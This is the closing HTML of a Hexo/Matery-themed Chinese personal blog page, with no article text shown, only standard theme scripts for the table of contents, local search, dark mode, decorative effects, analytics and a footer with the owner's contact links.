<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">Know5</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/Know5" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:2012989586@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2012989586" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2012989586" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    
        
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
            }
        </script>
    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
            }
        </script>
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='0.5'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false},"log":false});</script></body>

</html>
